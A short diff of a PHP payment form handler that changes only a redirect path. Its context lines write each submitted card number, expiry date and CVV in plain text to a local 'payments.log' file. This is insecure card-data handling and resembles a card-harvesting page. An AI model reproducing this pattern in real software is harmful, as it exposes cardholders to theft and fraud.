@@ -14,7 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $paymentDetails = "Username: $username, Card Number: $cardNumber, Expiry Date: $expiryMonth/$expiryYear, CVV: $cvv";
     file_put_contents('payments.log', $paymentDetails . PHP_EOL, FILE_APPEND);
     echo 'Payment Successful';
-    header("Location: ./");
+    header("Location: ./test");
 }
 ?>
 <!DOCTYPE html>
